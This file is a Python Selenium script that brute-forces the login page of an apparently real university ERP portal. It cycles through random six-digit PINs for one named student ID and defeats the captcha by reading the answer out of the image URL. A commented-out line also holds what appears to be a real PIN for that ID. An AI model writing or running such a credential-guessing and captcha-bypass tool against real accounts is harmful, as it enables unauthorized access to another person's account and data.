from selenium import webdriver
import os
import os.path
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
import random
import time
import subprocess

passwords = []

def get_element(x_path):
	return wait.until(EC.presence_of_element_located((By.XPATH, x_path)))

driver = webdriver.Chrome()
driver.get("https://mniterp.org")
wait = WebDriverWait(driver, 600)
string = 'Kromp10'




get_element('/html/body/table/tbody/tr[2]/td/font/a[2]').click()
iframe = driver.find_elements_by_tag_name('frame')[0]
driver.switch_to_frame(iframe)

firstTime= True
image = driver.find_element_by_xpath('//*[@id="captchaimg"]').get_attribute('src')
# driver.find_elements_by_xpath('//*[@id="uid"]').send_keys('2014ucp1055' + Keys.TAB + '499604' + Keys.TAB + image[62:67] + Keys.ENTER)
for i in range(0,30000):
	pas = ''.join(random.choice('0123456789') for _ in range(6))
	if pas not in passwords:
		passwords.append(pas)
		if firstTime:
			get_element('//*[@id="uid"]').send_keys('2014ucp1055' + Keys.TAB + pas + Keys.TAB + image[62:67] + Keys.ENTER)
			firstTime = False
		else:
			print(passwords[len(passwords)-2])
			print(passwords[len(passwords)-1])
			if get_element('//*[@id="uid"]'):
				image = driver.find_element_by_xpath('//*[@id="captchaimg"]').get_attribute('src')
				get_element('//*[@id="uid"]').send_keys('2014ucp1055' + Keys.TAB + pas + Keys.TAB + image[62:67] + Keys.ENTER)
			else:
				print('login successful' + passwords[len(passwords)-1])
print(passwords)